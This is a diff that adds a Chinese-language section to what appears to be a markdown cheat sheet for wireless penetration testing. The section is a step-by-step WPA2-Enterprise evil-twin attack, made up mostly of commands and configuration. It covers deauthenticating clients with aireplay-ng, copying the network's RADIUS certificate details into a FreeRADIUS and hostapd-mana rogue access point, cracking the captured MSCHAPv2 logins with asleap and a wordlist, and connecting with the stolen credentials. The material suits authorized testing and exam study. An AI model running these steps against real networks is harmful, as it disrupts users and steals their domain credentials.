@@ -52,6 +52,82 @@ service network-manager start
 
 
 
+```
+WPA2 企业版
+按照以下步骤设置无线监控并执行攻击。
+
+步骤 1：激活监控模式
+airmon-ng check kill && airmon-ng start <interface>
+第 2 步：检查 AUTH 列
+airodump-ng <interface>
+注意：AUTH 列将显示 MGT。
+
+步骤 3：捕获握手
+sudo airodump-ng -c channel -w ESSID interface
+步骤 4：取消客户端身份验证以捕获握手
+aireplay-ng -0 0 -a ESSID -c client_ESSID interface
+步骤 5：使用 Wireshark 或 tshark 分析
+收集 BSSID、ESSID 和频道后：
+
+使用带有过滤器的 Wireshark 或 tshark：
+wlan.bssid==E8:9C:12:02:66:AA && eap && tls.handshake.certificate
+或者
+tls.handshake.type == 11,3
+步骤 6：使用 OpenSSL 保存证书
+在 TLSv1 记录层 >> 握手协议 >> 证书中查看数据包详情：
+
+openssl x509 -inform der -in cert.der -text
+攻击所需的详细信息包括：发行人信息。
+
+步骤 6.5（可选）：将证书转换为 PEM 格式
+openssl x509 -inform der -in cert.der -outform pem -out output.crt
+步骤 7：设置 FreeRADIUS 服务器
+安装方式：
+
+sudo apt install freeradius
+编辑ca.cnf和server.cnf文件以减少可疑的证书颁发机构字段。
+
+sudo mousepad /etc/freeradius/3.0/certs/ca.cnf
+sudo mousepad /etc/freeradius/3.0/certs/server.cnf
+使用正确的信息更新相应部分。
+
+步骤 8：准备证书
+导航到/etc/freeradius/3.0/certs/并运行：
+
+sudo rm dh && make
+注意：如果 FreeRADIUS 需要其他配置，请忽略来自 FreeRADIUS 的错误。
+
+步骤 9：配置 hostapd-mana
+/etc/hostapd-mana/mana.conf使用正确的 SSID、证书路径和 EAP 文件进行编辑。
+
+步骤 10：设置mana.eap_user
+/etc/hostapd-mana/mana.eap_user使用所需的协议和身份验证方法进行配置。
+
+步骤11：启动hostapd-mana
+hostapd-mana /etc/hostapd-mana/mana.conf
+步骤 12：使用 asleap 查找用户
+使用正确的命令运行 asleap 来查找登录成功的用户。
+
+<asleap command> -W /usr/share/john/password.lst
+步骤13：创建wpa_supplicant.conf文件
+添加网络配置详细信息：
+
+network={
+  ssid="NetworkName"
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  identity="Domain\\username"
+  password="password"
+  eap=PEAP
+  phase1="peaplabel=0"
+  phase2="auth=MSCHAPV2"
+}
+步骤 14：连接到网络
+用于wpa_supplicant连接：
+
+wpa_supplicant -c <config file>
+```
+
 
 
 ## 路线图
